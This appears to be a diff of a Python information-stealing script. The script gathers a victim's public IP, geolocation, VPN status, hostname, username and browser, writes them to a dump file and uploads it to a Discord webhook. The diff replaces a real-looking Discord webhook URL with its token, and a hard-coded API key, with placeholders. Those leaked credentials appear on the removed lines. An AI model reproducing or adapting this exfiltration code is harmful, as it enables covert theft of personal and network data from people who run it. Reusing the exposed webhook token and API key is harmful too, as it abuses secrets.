@@ -28,7 +28,7 @@ os.system(f'cd {dir_path}')
 BROWSER = installedBrowser()
 IPLINK = "https://api.ipify.org/?format=json"
 GEOLINK = "http://ip-api.com/json/"
-VPNLink = "https://vpn-proxy-detection.ipify.org/api/v1?apiKey=vn7F0Phz34NOuVNquy9YTb2pAlY7M&ipAddress="
+VPNLink = "https://vpn-proxy-detection.ipify.org/api/v1?apiKey={YOUR API KEY}&ipAddress="
 IFCONFIG = "https://ifconfig.me/all.json"
 HOSTNAME = socket.gethostname()
 USERNAME = getpass.getuser()
@@ -83,7 +83,7 @@ from dhooks import Webhook, File
 from io import BytesIO
 import requests
 
-hook = Webhook("https://discord.com/api/webhooks/875150829328424961/lCOwE80YvqcGLSO1LHlCxrFKpWZZjSgmtBznlnP21n-KefNhuGTgD3-JryvSzj8aS7bN")
+hook = Webhook("WEBHOOK URL")
 
 file = File(f'{dir_path}\InfoDumped{USERNAME}.txt', name=f'InfoDumped{USERNAME}.txt')
 
